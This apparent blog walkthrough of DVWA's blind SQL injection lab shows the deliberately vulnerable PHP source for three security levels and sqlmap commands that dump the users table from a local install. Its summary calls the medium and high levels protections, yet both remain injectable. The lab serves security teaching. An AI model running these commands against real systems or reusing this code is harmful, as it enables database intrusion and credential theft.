Summary

The provided content discusses SQL Injection (Blind) vulnerabilities and their mitigation at different security levels within the DVWA (Damn Vulnerable Web Application) platform, illustrating how attackers can extract information without direct feedback from the database and how various security measures can be implemented to prevent such attacks.

Abstract

The web content delves into the concept of Blind SQL Injection, a technique where attackers manipulate SQL queries to interact with the database without receiving explicit responses. It outlines the vulnerability's nature, where attackers use trial and error to infer information based on the web application's behavior. The content presents source code examples for low, medium, and high-security settings in DVWA, demonstrating the progression of security measures. At the low security level, the PHP code directly uses user input in SQL queries, which is susceptible to SQL injection. The medium security level introduces `mysqli_real_escape_string` to sanitize user input, while the high security level moves user input to cookies and implements a random sleep function to hinder automated attacks. The content also includes examples of using sqlmap, an automated tool, to detect and exploit SQL injection flaws. The article concludes with a note thanking the reader for their attention and expressing hope that the information provided was useful.

Opinions

- The author implies that Blind SQL Injection is a sophisticated attack that requires advanced techniques to detect and prevent.
- The progression from low to high security levels suggests that the author values layered security approaches, emphasizing the importance of input sanitization and unpredictable response times to deter attackers.
- The inclusion of sqlmap payloads indicates the author's recognition of the importance of penetration testing tools in identifying and mitigating vulnerabilities.
- The use of DVWA as a learning platform is endorsed by the author, highlighting its utility for understanding and practicing SQL injection defense mechanisms.
- The author assumes that the reader has a basic understanding of web application security and SQL injection techniques, as the content does not provide foundational explanations for these concepts.
# DVWA: SQL Injection (Blind)

> SQL Injection (Blind) is a form of SQL injection attack where the attacker does not receive direct responses from the database server showing the results of their manipulation. In Blind SQL Injection attacks, the attacker injects SQL into a web application to extract information from the database, but they do not see the direct results of the attack. Instead, they must rely on testing and analysis techniques to determine whether the attack was successful or not.

![](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*92gT2agP4BMopzsC9o5vxQ.png)

SQL Injection (Blind) Vulnerability

# 1. Security — Low (GET)

# Source Code SQL Injection - Low
```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Get input
    $id = $_GET[ 'id' ];
    $exists = false;

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            // Check database
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ); // Removed 'or die' to suppress mysql errors

            $exists = false;
            if ($result !== false) {
                try {
                    $exists = (mysqli_num_rows( $result ) > 0);
                } catch(Exception $e) {
                    $exists = false;
                }
            }
            ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
            break;
        case SQLITE:
            global $sqlite_db_connection;

            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
            try {
                $results = $sqlite_db_connection->query($query);
                $row = $results->fetchArray();
                $exists = $row !== false;
            } catch(Exception $e) {
                $exists = false;
            }

            break;
    }

    if ($exists) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    } else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

}
?> 
```
![](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*pBB5MoepvFcFdmxyNCFWOw.png)

Payload: 
```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
--cookie="PHPSESSID=sik8mit21hrgujka27r06gep1g; security=low" \
--batch --random-agent --dbms=mysql -D dvwa -T users --dump

```

![](https://i.imgur.com/8y00Yu1.png)
![](https://i.imgur.com/o296BUW.png)
# 2. Security — Medium (POST)

# Source Code SQL Injection - Medium
```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $id = $_POST[ 'id' ];
    $exists = false;

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            $id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

            // Check database
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ); // Removed 'or die' to suppress mysql errors

            $exists = false;
            if ($result !== false) {
                try {
                    $exists = (mysqli_num_rows( $result ) > 0); // The '@' character suppresses errors
                } catch(Exception $e) {
                    $exists = false;
                }
            }
            
            break;
        case SQLITE:
            global $sqlite_db_connection;
            
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
            try {
                $results = $sqlite_db_connection->query($query);
                $row = $results->fetchArray();
                $exists = $row !== false;
            } catch(Exception $e) {
                $exists = false;
            }
            break;
    }

    if ($exists) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    } else {
        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }
}

?>
```

![](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*naafZm0WcWg1JsxUUzBucA.png)

Payload: 
```ruby
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli_blind/" \
--data="id=1&Submit=Submit" \
--cookie="PHPSESSID=sik8mit21hrgujka27r06gep1g; security=medium" \
--batch --random-agent --dbms=mysql -D dvwa -T users --dump

```
![](https://i.imgur.com/HfKXrrx.png)
![](https://i.imgur.com/r5cjHkO.png)

# 3. Security — High

# Source Code SQL Injection - High
```php
<?php

if( isset( $_COOKIE[ 'id' ] ) ) {
    // Get input
    $id = $_COOKIE[ 'id' ];
    $exists = false;

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            // Check database
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ); // Removed 'or die' to suppress mysql errors

            $exists = false;
            if ($result !== false) {
                // Get results
                try {
                    $exists = (mysqli_num_rows( $result ) > 0); // The '@' character suppresses errors
                } catch(Exception $e) {
                    $exists = false;
                }
            }

            ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
            break;
        case SQLITE:
            global $sqlite_db_connection;

            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
            try {
                $results = $sqlite_db_connection->query($query);
                $row = $results->fetchArray();
                $exists = $row !== false;
            } catch(Exception $e) {
                $exists = false;
            }

            break;
    }

    if ($exists) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Might sleep a random amount
        if( rand( 0, 5 ) == 3 ) {
            sleep( rand( 2, 4 ) );
        }

        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }
}

?>
```
 

![](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*rYOKgnACTI-c7hoZp1KHtA.png)
Payload: 
```ruby
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli_blind/cookie-input.php" \
--data="id=1&Submit=Submit" \
--cookie="id=1; PHPSESSID=sik8mit21hrgujka27r06gep1g; security=high" \
--second-url="http://localhost/DVWA/vulnerabilities/sqli_blind/" \
--random-agent --batch --dbms=mysql -D dvwa -T users --dump

```
![](https://i.imgur.com/feHd6Ya.png)
![](https://i.imgur.com/aJURMBg.png)
![Uploading file...tsnk6]()

Thats it.

Thank you for reading. I hope it was helpful.